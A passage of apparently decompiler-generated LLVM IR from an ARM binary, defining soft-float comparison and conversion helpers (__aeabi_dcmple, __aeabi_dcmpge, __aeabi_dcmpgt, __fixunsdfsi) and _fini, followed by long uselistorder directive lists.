}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_156b8 = call i32 @__aeabi_cdcmple()
  %v0_156bc = load i1, i1* @cpsr_z, align 1
  %v1_156bc = load i1, i1* @cpsr_c, align 1
  %v2_156bc = xor i1 %v1_156bc, true
  %v3_156bc = or i1 %v0_156bc, %v2_156bc
  %.v0_156b8 = select i1 %v3_156bc, i32 1, i32 %v0_156b8
  %v2_156c0 = xor i1 %v0_156bc, true
  %v3_156c0 = and i1 %v1_156bc, %v2_156c0
  %..v0_156b8 = select i1 %v3_156c0, i32 0, i32 %.v0_156b8
  ret i32 %..v0_156b8

; uselistorder directives
  uselistorder i1 %v1_156bc, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_156cc = load i32, i32* @lr, align 4
  store i32 %v0_156cc, i32* %stack_var_-8, align 4
  %v0_156d0 = call i32 @__aeabi_cdrcmple()
  %v0_156d4 = load i1, i1* @cpsr_z, align 1
  %v1_156d4 = load i1, i1* @cpsr_c, align 1
  %v2_156d4 = xor i1 %v1_156d4, true
  %v3_156d4 = or i1 %v0_156d4, %v2_156d4
  %.v0_156d0 = select i1 %v3_156d4, i32 1, i32 %v0_156d0
  %v2_156d8 = xor i1 %v0_156d4, true
  %v3_156d8 = and i1 %v1_156d4, %v2_156d8
  %..v0_156d0 = select i1 %v3_156d8, i32 0, i32 %.v0_156d0
  %v2_156dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156dc, i32* @lr, align 4
  ret i32 %..v0_156d0

; uselistorder directives
  uselistorder i1 %v1_156d4, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 98, 1, 89, 6, 7, 8, 9, 10, 11, 81, 82, 90, 91, 83, 12, 13, 14, 84, 85, 86, 92, 15, 16, 17, 18, 95, 21, 22, 23, 24, 19, 20, 96, 25, 97, 26, 27, 28, 29, 30, 31, 32, 79, 33, 34, 35, 36, 80, 39, 38, 37, 100, 101, 102, 103, 104, 105, 106, 87, 107, 108, 109, 94, 110, 111, 112, 113, 88, 114, 115, 116, 117, 118, 119, 120, 40, 121, 99, 122, 41, 42, 43, 44, 45, 46, 93, 123, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i1* @cpsr_z, { 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 17, 18, 19, 20, 21, 34, 35, 36, 37, 22, 23 }
  uselistorder i32* @lr, { 10, 11, 12, 13, 14, 5, 6, 7, 8, 9, 15, 0, 16, 1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 47, 48, 52, 53, 54, 58, 59, 60, 30, 31, 32, 33, 34, 35, 3, 4, 36, 37, 38, 39, 61, 62, 63, 64, 65, 68, 78, 79, 72, 80, 81, 82, 83, 84, 85, 86, 87, 40, 88, 89, 90, 98, 91, 92, 93, 94, 95, 96, 97, 99, 100, 69, 70, 71, 55, 56, 57, 45, 122, 123, 124, 125, 126, 127, 128, 129, 130, 73, 74, 75, 76, 77, 49, 50, 51, 41, 66, 67, 46, 42, 43, 101, 102, 131, 132, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 2, 115, 116, 118, 119, 117, 44, 120, 121 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_156e8 = call i32 @__aeabi_cdrcmple()
  %v0_156ec = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_156ec to i32
  %.v0_156e8. = xor i32 %tmp2, 1
  ret i32 %.v0_156e8.

; uselistorder directives
  uselistorder i32 1, { 544, 557, 620, 558, 545, 858, 857, 859, 621, 219, 221, 220, 225, 224, 223, 218, 222, 860, 622, 861, 623, 30, 32, 28, 29, 31, 374, 281, 280, 516, 373, 624, 379, 380, 862, 863, 358, 357, 864, 467, 468, 469, 625, 337, 338, 333, 334, 335, 336, 963, 472, 964, 626, 195, 196, 198, 197, 865, 866, 867, 627, 383, 385, 384, 381, 382, 965, 560, 966, 967, 628, 179, 180, 181, 178, 184, 183, 182, 968, 969, 868, 501, 869, 502, 517, 870, 871, 872, 561, 873, 489, 518, 484, 503, 874, 562, 875, 876, 877, 0, 878, 478, 879, 473, 880, 563, 881, 882, 883, 519, 884, 641, 640, 639, 638, 637, 636, 635, 634, 633, 632, 631, 630, 612, 629, 14, 22, 13, 15, 24, 18, 16, 27, 17, 25, 26, 20, 19, 21, 23, 885, 886, 189, 187, 192, 194, 190, 191, 188, 193, 73, 485, 642, 130, 129, 643, 359, 887, 645, 644, 203, 201, 200, 204, 202, 205, 520, 551, 648, 647, 646, 649, 207, 206, 970, 564, 565, 971, 985, 652, 651, 650, 387, 389, 386, 388, 987, 653, 185, 186, 988, 521, 989, 990, 654, 96, 97, 991, 655, 95, 888, 889, 656, 390, 504, 890, 76, 566, 657, 541, 891, 892, 568, 893, 894, 895, 896, 897, 569, 898, 899, 900, 901, 902, 570, 904, 523, 522, 903, 567, 905, 906, 571, 907, 908, 909, 662, 613, 661, 660, 659, 658, 170, 168, 169, 172, 175, 167, 177, 173, 176, 174, 171, 910, 663, 392, 395, 394, 396, 391, 393, 505, 664, 328, 327, 911, 912, 913, 164, 165, 163, 166, 543, 479, 915, 916, 492, 917, 918, 1, 2, 919, 921, 480, 922, 573, 923, 493, 920, 572, 674, 673, 672, 671, 670, 669, 668, 667, 666, 665, 149, 150, 151, 574, 506, 675, 152, 153, 154, 914, 552, 614, 524, 677, 676, 678, 247, 246, 346, 679, 245, 244, 992, 681, 680, 250, 249, 248, 682, 329, 575, 993, 994, 995, 490, 996, 553, 525, 997, 998, 494, 999, 1000, 685, 684, 683, 400, 398, 399, 397, 686, 403, 402, 401, 1001, 1002, 1003, 1012, 1013, 1014, 1021, 576, 577, 695, 694, 693, 692, 619, 691, 690, 689, 688, 687, 405, 408, 409, 406, 407, 404, 1024, 696, 276, 274, 275, 277, 546, 1048, 1049, 539, 1050, 1052, 474, 1053, 579, 536, 535, 578, 1054, 486, 507, 533, 554, 1055, 1056, 1057, 1058, 1059, 3, 1062, 1051, 580, 1063, 542, 704, 615, 703, 702, 701, 700, 699, 698, 697, 369, 367, 366, 368, 1064, 1065, 1066, 1067, 1068, 475, 1069, 705, 261, 258, 260, 256, 255, 257, 262, 259, 924, 925, 926, 927, 928, 929, 930, 931, 526, 932, 933, 709, 708, 707, 706, 251, 252, 253, 254, 934, 935, 936, 937, 938, 712, 711, 710, 306, 301, 305, 308, 304, 303, 302, 300, 309, 307, 527, 1070, 528, 1071, 1072, 1073, 1074, 4, 1075, 1076, 1077, 1078, 1079, 1080, 714, 713, 124, 123, 126, 127, 122, 128, 125, 559, 1081, 1082, 1083, 1084, 1085, 715, 269, 268, 270, 271, 272, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 716, 265, 263, 264, 266, 267, 1025, 717, 410, 411, 412, 718, 330, 1026, 1027, 1028, 719, 111, 113, 112, 114, 108, 115, 109, 110, 720, 99, 98, 100, 721, 103, 104, 101, 107, 105, 102, 106, 722, 464, 343, 78, 83, 77, 82, 86, 85, 81, 84, 79, 80, 723, 93, 92, 90, 89, 91, 87, 88, 724, 33, 34, 41, 42, 38, 39, 37, 40, 35, 36, 465, 725, 314, 371, 370, 1015, 581, 1016, 1017, 1018, 1019, 1020, 726, 162, 160, 159, 161, 313, 312, 529, 1104, 1105, 1106, 1107, 728, 727, 155, 157, 158, 156, 495, 540, 496, 1155, 1156, 1157, 1158, 530, 729, 94, 731, 730, 413, 414, 1040, 732, 957, 958, 74, 75, 508, 972, 1184, 973, 974, 975, 509, 959, 977, 976, 481, 733, 960, 734, 416, 417, 418, 415, 1186, 510, 1187, 1188, 1189, 1190, 1191, 1192, 845, 1193, 1194, 1195, 1196, 1197, 1198, 846, 616, 736, 735, 140, 141, 146, 148, 147, 142, 139, 143, 145, 144, 1038, 1029, 1036, 1037, 537, 511, 323, 319, 320, 321, 322, 582, 1030, 1031, 1034, 1035, 737, 617, 315, 316, 1033, 738, 349, 351, 352, 353, 350, 583, 1032, 740, 739, 421, 424, 422, 419, 420, 423, 1039, 741, 229, 228, 227, 978, 979, 742, 238, 237, 743, 425, 939, 744, 232, 231, 233, 235, 234, 230, 236, 584, 940, 1041, 1042, 1043, 1044, 585, 1045, 1046, 1047, 512, 747, 746, 745, 427, 426, 430, 428, 429, 431, 1004, 1005, 1006, 749, 748, 131, 132, 586, 986, 750, 243, 980, 981, 982, 983, 984, 587, 751, 116, 118, 120, 117, 119, 588, 121, 941, 752, 212, 589, 753, 332, 590, 754, 215, 213, 214, 755, 342, 341, 340, 756, 199, 757, 363, 362, 758, 217, 216, 759, 760, 284, 282, 283, 761, 365, 364, 762, 273, 763, 432, 764, 287, 765, 241, 242, 1199, 591, 1200, 1201, 592, 766, 69, 65, 70, 68, 66, 71, 72, 67, 310, 593, 209, 208, 767, 433, 434, 435, 471, 279, 487, 854, 855, 856, 768, 769, 497, 1007, 498, 1008, 1009, 488, 1010, 437, 438, 436, 439, 440, 442, 441, 1011, 499, 942, 50, 53, 52, 51, 54, 1108, 531, 1109, 771, 770, 59, 57, 56, 55, 61, 62, 60, 58, 772, 47, 49, 45, 43, 44, 46, 48, 773, 6, 11, 7, 10, 9, 12, 8, 774, 775, 1202, 532, 555, 777, 776, 778, 1111, 1114, 1115, 1116, 779, 443, 448, 449, 447, 446, 450, 444, 445, 1117, 1118, 1119, 1120, 780, 455, 461, 454, 460, 459, 453, 463, 462, 457, 451, 456, 452, 458, 1112, 1113, 594, 318, 317, 1121, 1122, 1123, 1124, 1125, 1126, 547, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 596, 1135, 1136, 1137, 1138, 1139, 595, 1140, 1141, 1142, 1143, 1144, 781, 290, 292, 288, 291, 294, 298, 297, 295, 299, 293, 296, 289, 361, 360, 597, 598, 943, 491, 785, 784, 783, 782, 311, 786, 240, 239, 787, 354, 788, 372, 226, 789, 356, 790, 791, 513, 1185, 1060, 1061, 137, 138, 1023, 1022, 847, 848, 849, 850, 851, 852, 853, 1203, 134, 135, 136, 792, 793, 376, 375, 339, 794, 325, 324, 286, 285, 211, 210, 795, 348, 347, 796, 355, 797, 331, 326, 798, 466, 278, 799, 800, 345, 344, 476, 1161, 378, 377, 944, 482, 500, 945, 946, 947, 477, 948, 949, 950, 548, 951, 952, 953, 954, 599, 600, 549, 601, 806, 805, 804, 803, 802, 801, 602, 955, 956, 808, 807, 961, 962, 809, 1110, 815, 814, 813, 812, 811, 810, 1145, 603, 816, 556, 604, 605, 1146, 606, 1147, 824, 823, 822, 821, 820, 819, 818, 817, 534, 1148, 1149, 1150, 607, 483, 1151, 1152, 1153, 608, 1154, 827, 826, 825, 618, 1159, 1160, 831, 830, 829, 828, 1162, 1163, 609, 1172, 1173, 538, 1174, 833, 832, 550, 5, 837, 836, 835, 834, 515, 1164, 1165, 1166, 514, 1167, 1170, 1171, 610, 838, 611, 1168, 1169, 839, 133, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 841, 840, 64, 1183, 842, 63, 843, 844, 470 }
  uselistorder i1 false, { 37, 13, 14, 11, 15, 50, 51, 52, 53, 54, 55, 8, 9, 12, 56, 57, 58, 59, 10, 38, 35, 39, 40, 41, 42, 43, 3, 32, 2, 5, 60, 16, 6, 7, 17, 18, 36, 1, 30, 0, 21, 22, 23, 44, 19, 20, 45, 46, 47, 48, 49, 24, 27, 26, 25, 28, 29, 4, 34, 31, 33, 61, 62, 63, 64 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_156fc = icmp slt i32 %arg2, 0
  %v2_156fc = mul i32 %arg2, 2
  br i1 %v1_156fc, label %dec_label_pc_15730, label %dec_label_pc_15704

dec_label_pc_15704:                               ; preds = %entry
  %v1_15704 = add i32 %v2_156fc, 2097152
  %v2_15704 = icmp ugt i32 %v2_156fc, -2097153
  br i1 %v2_15704, label %dec_label_pc_15738, label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %dec_label_pc_15704
  %v6_15704 = icmp slt i32 %v1_15704, 0
  br i1 %v6_15704, label %dec_label_pc_15710, label %dec_label_pc_15730

dec_label_pc_15710:                               ; preds = %dec_label_pc_1570c
  %v4_15714 = sdiv i32 %v1_15704, 2097152
  %v5_15714 = sub nsw i32 -993, %v4_15714
  %v11_15714 = icmp slt i32 %v5_15714, 0
  br i1 %v11_15714, label %dec_label_pc_15740, label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %dec_label_pc_15710
  %v3_1571c = mul i32 %arg2, 2048
  %v4_15724 = udiv i32 %arg1, 2097152
  %v1_15720 = or i32 %v4_15724, %v3_1571c
  %v5_15724 = or i32 %v1_15720, -2147483648
  %v6_15728 = lshr i32 %v5_15724, %v5_15714
  ret i32 %v6_15728

dec_label_pc_15730:                               ; preds = %dec_label_pc_1570c, %entry
  ret i32 0

dec_label_pc_15738:                               ; preds = %dec_label_pc_15704
  %v4_15738 = mul i32 %arg2, 4096
  %v5_15738 = or i32 %v4_15738, %arg1
  %v7_15738 = icmp eq i32 %v5_15738, 0
  br i1 %v7_15738, label %dec_label_pc_15740, label %dec_label_pc_15748

dec_label_pc_15740:                               ; preds = %dec_label_pc_15738, %dec_label_pc_15710
  ret i32 -1

dec_label_pc_15748:                               ; preds = %dec_label_pc_15738
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 32, 234, 154, 155, 35, 36, 33, 34, 156, 37, 1, 157, 158, 159, 160, 2, 161, 162, 3, 4, 163, 73, 235, 164, 236, 237, 74, 165, 238, 166, 71, 38, 167, 239, 5, 39, 168, 75, 240, 170, 241, 242, 72, 63, 64, 243, 244, 245, 246, 247, 134, 76, 248, 135, 6, 169, 65, 66, 171, 249, 250, 251, 172, 139, 140, 252, 173, 253, 254, 141, 77, 283, 142, 285, 78, 286, 129, 255, 174, 79, 143, 80, 256, 175, 176, 257, 258, 40, 259, 260, 67, 261, 177, 178, 128, 136, 130, 7, 179, 262, 180, 181, 41, 263, 266, 287, 81, 288, 289, 8, 82, 290, 291, 182, 183, 126, 184, 138, 83, 9, 185, 300, 68, 69, 301, 186, 131, 187, 132, 188, 10, 189, 137, 133, 302, 303, 53, 54, 55, 56, 58, 70, 11, 12, 61, 264, 13, 14, 15, 85, 89, 84, 86, 123, 124, 90, 88, 87, 144, 265, 91, 190, 191, 192, 193, 194, 294, 195, 267, 268, 269, 92, 270, 93, 298, 94, 271, 95, 273, 16, 196, 304, 305, 197, 42, 43, 44, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 198, 199, 17, 200, 127, 295, 297, 201, 96, 296, 202, 18, 45, 299, 292, 145, 284, 203, 20, 19, 204, 205, 21, 272, 206, 97, 336, 98, 337, 99, 309, 62, 310, 100, 274, 101, 338, 102, 278, 103, 311, 312, 22, 207, 208, 209, 313, 293, 147, 146, 104, 275, 60, 210, 105, 276, 211, 23, 212, 148, 314, 27, 213, 214, 26, 28, 315, 25, 215, 216, 46, 24, 217, 47, 48, 49, 50, 218, 219, 220, 57, 279, 280, 29, 106, 306, 107, 307, 108, 317, 109, 110, 316, 59, 51, 52, 221, 111, 308, 112, 319, 113, 277, 114, 340, 115, 320, 116, 339, 117, 281, 118, 318, 119, 120, 121, 282, 222, 223, 122, 149, 125, 150, 151, 152, 30, 224, 225, 226, 227, 228, 229, 230, 231, 31, 232, 233, 153 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 18, 5, 6, 19, 7, 8, 9, 10, 20, 23, 15, 24, 22, 12, 11, 13, 25, 14, 16, 21, 17 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 18, 19, 20, 21, 2 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 141, 36, 37, 38, 131, 39, 40, 41, 42, 43, 142, 143, 144, 132, 44, 45, 93, 145, 91, 146, 147, 46, 47, 148, 149, 160, 161, 162, 164, 165, 166, 92, 94, 150, 151, 115, 48, 49, 50, 51, 52, 116, 152, 111, 110, 53, 153, 154, 155, 167, 54, 118, 168, 169, 170, 55, 119, 171, 172, 173, 117, 120, 176, 0, 179, 133, 134, 95, 121, 180, 122, 156, 56, 157, 181, 182, 183, 57, 96, 97, 112, 98, 113, 99, 174, 58, 59, 60, 175, 163, 184, 185, 186, 187, 61, 62, 135, 100, 101, 199, 200, 108, 201, 202, 102, 203, 204, 177, 136, 178, 137, 123, 124, 63, 140, 64, 103, 65, 66, 106, 158, 89, 67, 205, 107, 189, 68, 69, 190, 70, 71, 90, 72, 73, 74, 75, 109, 191, 192, 76, 77, 1, 138, 193, 78, 194, 188, 104, 79, 80, 139, 81, 82, 83, 84, 85, 125, 159, 126, 127, 128, 105, 129, 86, 87, 197, 114, 195, 88, 196, 198, 130 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_15754 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_15754)
  %v31_1575c = load i32, i32* @r0, align 4
  ret i32 %v31_1575c

; uselistorder directives
  uselistorder i32* @r0, { 26, 124, 118, 119, 120, 121, 122, 123, 27, 24, 125, 86, 126, 5, 87, 127, 128, 85, 88, 129, 28, 25, 130, 131, 132, 133, 115, 29, 116, 117, 30, 31, 134, 135, 136, 137, 138, 139, 22, 140, 141, 32, 142, 143, 6, 209, 211, 93, 210, 2, 7, 144, 145, 82, 83, 146, 147, 148, 84, 149, 150, 151, 33, 152, 153, 154, 155, 34, 222, 221, 156, 157, 158, 44, 159, 160, 161, 8, 9, 162, 163, 10, 12, 0, 1, 164, 165, 11, 166, 167, 168, 36, 89, 169, 170, 171, 172, 173, 35, 174, 14, 175, 176, 4, 177, 178, 179, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 235, 236, 237, 250, 251, 252, 253, 254, 255, 256, 257, 96, 258, 180, 259, 260, 261, 263, 262, 15, 37, 241, 186, 245, 187, 38, 39, 40, 238, 94, 239, 240, 95, 60, 264, 265, 266, 267, 268, 61, 16, 292, 17, 42, 18, 19, 213, 3, 214, 202, 203, 204, 244, 45, 243, 46, 242, 181, 182, 183, 184, 185, 246, 247, 248, 249, 47, 212, 215, 216, 217, 218, 219, 220, 48, 49, 188, 189, 190, 50, 51, 52, 53, 54, 193, 55, 293, 295, 296, 105, 106, 107, 108, 109, 110, 111, 112, 56, 57, 113, 114, 294, 234, 58, 269, 270, 271, 272, 191, 192, 277, 59, 97, 98, 278, 13, 279, 280, 281, 282, 283, 284, 285, 286, 66, 273, 41, 62, 20, 63, 43, 291, 287, 64, 65, 194, 195, 196, 197, 90, 91, 92, 198, 199, 200, 201, 99, 100, 101, 23, 21, 102, 205, 206, 207, 208, 274, 275, 276, 288, 289, 290, 103, 104, 67, 68, 69, 70, 71, 79, 80, 81, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 16, 17, 18, 19, 20, 77, 78, 79, 51, 52, 53, 40, 41, 42, 91, 60, 61, 62, 63, 64, 65, 66, 67, 68, 54, 55, 56, 57, 58, 59, 69, 70, 37, 38, 39, 21, 71, 72, 73, 74, 75, 76, 43, 44, 45, 46, 47, 48, 49, 50, 22, 23, 24, 25, 26, 27, 96, 97, 98, 99, 100, 92, 83, 93, 94, 95, 0, 80, 81, 82, 28, 29, 30, 31, 32, 33, 34, 35, 36, 101, 102, 103, 84, 85, 86, 87, 88, 89, 104, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 90 }
  uselistorder i32 0, { 0, 522, 1, 523, 524, 466, 355, 356, 525, 526, 527, 528, 529, 530, 531, 3, 4, 5, 532, 533, 2, 534, 535, 467, 6, 536, 537, 29, 468, 538, 539, 540, 541, 542, 543, 544, 545, 87, 86, 176, 177, 178, 546, 547, 548, 7, 549, 550, 30, 551, 552, 553, 31, 32, 169, 554, 555, 556, 557, 33, 170, 360, 558, 559, 560, 561, 562, 563, 34, 564, 9, 8, 35, 469, 565, 471, 470, 566, 567, 568, 569, 570, 10, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 472, 521, 571, 572, 573, 574, 575, 11, 576, 473, 577, 578, 579, 580, 171, 172, 361, 581, 582, 13, 12, 583, 584, 585, 586, 587, 588, 589, 474, 475, 590, 477, 591, 592, 478, 479, 593, 594, 476, 595, 480, 596, 481, 597, 598, 599, 600, 14, 867, 868, 869, 870, 107, 871, 179, 872, 873, 874, 875, 876, 877, 878, 180, 482, 485, 483, 484, 879, 880, 881, 882, 883, 884, 108, 601, 602, 603, 604, 605, 606, 181, 88, 317, 607, 608, 609, 115, 610, 362, 611, 612, 613, 614, 615, 616, 885, 886, 47, 48, 895, 896, 887, 888, 889, 890, 891, 892, 893, 894, 897, 182, 116, 486, 617, 49, 117, 618, 619, 279, 118, 487, 281, 620, 50, 96, 621, 622, 280, 623, 624, 625, 626, 627, 184, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 120, 119, 185, 186, 640, 641, 642, 643, 644, 645, 121, 122, 646, 647, 648, 649, 650, 651, 36, 652, 653, 654, 655, 656, 51, 187, 657, 123, 364, 658, 659, 660, 661, 662, 365, 188, 663, 664, 665, 666, 329, 667, 668, 669, 328, 670, 671, 327, 672, 673, 183, 674, 363, 675, 190, 676, 37, 677, 324, 319, 678, 679, 680, 366, 367, 681, 682, 683, 325, 326, 684, 685, 686, 189, 687, 688, 689, 690, 691, 692, 693, 15, 694, 695, 696, 488, 697, 698, 699, 700, 701, 702, 704, 703, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 720, 719, 282, 721, 722, 124, 723, 898, 905, 900, 901, 903, 902, 904, 90, 191, 928, 935, 192, 936, 99, 937, 100, 938, 101, 939, 102, 940, 193, 941, 942, 194, 724, 725, 196, 726, 727, 195, 728, 197, 729, 730, 283, 731, 198, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 125, 742, 743, 744, 745, 747, 748, 746, 749, 126, 750, 753, 751, 752, 199, 368, 754, 755, 756, 200, 201, 757, 758, 759, 760, 761, 762, 369, 763, 764, 370, 765, 767, 202, 766, 284, 276, 768, 769, 771, 127, 772, 204, 773, 71, 72, 69, 70, 774, 371, 109, 103, 775, 776, 777, 207, 205, 206, 372, 778, 779, 780, 68, 203, 781, 782, 783, 784, 785, 786, 787, 788, 789, 373, 110, 312, 89, 790, 791, 792, 16, 208, 500, 501, 113, 73, 97, 770, 285, 793, 812, 813, 946, 947, 948, 209, 949, 950, 951, 210, 952, 953, 67, 76, 77, 91, 954, 74, 955, 75, 956, 957, 958, 128, 129, 959, 960, 961, 211, 962, 963, 320, 964, 965, 374, 966, 967, 968, 969, 970, 971, 972, 78, 973, 974, 92, 1007, 989, 990, 991, 992, 993, 994, 286, 995, 996, 997, 998, 1042, 1062, 1063, 1064, 1006, 130, 1065, 330, 315, 316, 375, 1066, 1067, 1068, 1070, 1071, 1072, 1073, 38, 1074, 1075, 52, 1076, 1077, 1078, 1079, 1082, 1083, 1084, 1085, 1086, 1087, 212, 1088, 1089, 489, 1090, 1080, 1069, 490, 277, 491, 1081, 1091, 1092, 1093, 1094, 53, 1096, 54, 1095, 131, 1097, 1098, 213, 794, 795, 796, 797, 798, 93, 799, 800, 214, 39, 215, 801, 376, 802, 318, 216, 217, 377, 378, 219, 1099, 1100, 1101, 1102, 1103, 220, 218, 379, 380, 1104, 1105, 1106, 1107, 221, 381, 1108, 382, 1109, 55, 56, 57, 58, 357, 222, 1110, 104, 1111, 224, 223, 383, 384, 1112, 1113, 1114, 1008, 1009, 1010, 1011, 1012, 132, 1013, 1014, 1015, 17, 1016, 287, 79, 1017, 385, 1018, 1019, 1020, 331, 332, 814, 815, 1043, 999, 943, 944, 333, 945, 386, 803, 387, 804, 821, 822, 832, 18, 133, 1000, 388, 225, 1001, 1002, 1003, 1004, 1005, 134, 235, 234, 233, 228, 231, 226, 230, 227, 232, 229, 929, 930, 931, 932, 389, 1115, 1116, 1117, 236, 1118, 1119, 1120, 1121, 1122, 1123, 237, 1124, 135, 1188, 1189, 1190, 1191, 238, 239, 1192, 1044, 240, 906, 907, 908, 288, 1217, 80, 289, 1221, 1222, 98, 59, 856, 857, 290, 60, 909, 94, 241, 858, 859, 1223, 1224, 1225, 1226, 1227, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1228, 1229, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 40, 1248, 1249, 1250, 1251, 1252, 41, 1253, 1254, 1255, 42, 1256, 1257, 1258, 43, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1283, 1284, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 44, 1302, 1303, 1304, 1305, 1306, 45, 1307, 1308, 1309, 1310, 1311, 46, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 242, 1021, 492, 1022, 1039, 1023, 1024, 1036, 390, 391, 1037, 1038, 136, 137, 138, 1025, 1026, 1034, 1031, 1032, 1033, 291, 314, 1035, 139, 1029, 1027, 1028, 292, 1030, 140, 1040, 1041, 19, 20, 141, 910, 142, 806, 805, 294, 808, 807, 293, 809, 810, 392, 811, 143, 1045, 1046, 1047, 81, 82, 1048, 1049, 1050, 243, 1051, 1052, 1053, 1054, 1055, 393, 1056, 1057, 1058, 1059, 1060, 1061, 144, 975, 976, 977, 978, 145, 21, 244, 246, 933, 245, 934, 247, 899, 146, 911, 916, 917, 912, 913, 914, 919, 920, 921, 248, 922, 923, 924, 925, 926, 915, 918, 927, 147, 816, 817, 818, 249, 819, 820, 250, 823, 827, 828, 829, 830, 251, 824, 252, 825, 826, 148, 831, 1327, 1328, 1132, 833, 1133, 1134, 1135, 253, 1136, 834, 835, 1329, 111, 1330, 843, 149, 254, 1331, 1332, 1137, 1138, 150, 394, 1337, 1338, 395, 1339, 1340, 255, 296, 1341, 1342, 396, 83, 1343, 1344, 397, 1349, 1353, 493, 295, 1354, 398, 1350, 1351, 1352, 1333, 1334, 494, 256, 278, 502, 22, 23, 503, 505, 504, 257, 506, 507, 508, 399, 509, 1335, 1336, 979, 980, 981, 982, 983, 984, 259, 151, 985, 986, 987, 105, 258, 988, 400, 836, 152, 837, 153, 838, 260, 1126, 1127, 1128, 24, 1125, 839, 840, 154, 155, 156, 106, 841, 157, 401, 402, 1347, 261, 334, 158, 159, 1144, 1145, 1146, 1147, 1148, 262, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 263, 1139, 403, 1140, 1141, 404, 1142, 1143, 160, 1156, 1157, 267, 265, 266, 1158, 1159, 273, 272, 174, 264, 1160, 1161, 1162, 1163, 1164, 1165, 322, 321, 335, 405, 1166, 1167, 1168, 84, 1169, 269, 268, 270, 271, 173, 1170, 1171, 297, 1172, 1173, 114, 1174, 1175, 1176, 1177, 1178, 25, 26, 844, 845, 85, 161, 1129, 1130, 1186, 1181, 1182, 1193, 162, 1218, 1219, 1220, 298, 406, 27, 1355, 1356, 95, 1131, 1345, 1194, 842, 1348, 1216, 1346, 846, 1187, 1179, 847, 407, 848, 28, 1195, 1196, 1197, 112, 1198, 1199, 1200, 1201, 1202, 274, 1203, 495, 498, 496, 497, 1204, 499, 323, 412, 413, 299, 61, 336, 408, 175, 409, 410, 337, 411, 849, 414, 850, 415, 416, 851, 852, 417, 853, 358, 854, 418, 855, 419, 163, 338, 420, 339, 275, 860, 861, 421, 862, 864, 422, 423, 863, 300, 865, 866, 340, 425, 426, 424, 427, 429, 428, 430, 1180, 341, 342, 343, 344, 1183, 433, 431, 432, 301, 1184, 434, 1185, 62, 440, 63, 439, 435, 438, 303, 441, 436, 437, 302, 442, 345, 164, 443, 444, 445, 446, 447, 1215, 165, 64, 313, 304, 348, 349, 1205, 1206, 1207, 305, 346, 347, 350, 1208, 1209, 351, 1210, 1211, 307, 65, 166, 167, 306, 1213, 1214, 359, 168, 66, 448, 1212, 449, 308, 450, 451, 310, 309, 452, 311, 352, 510, 353, 354, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371 }
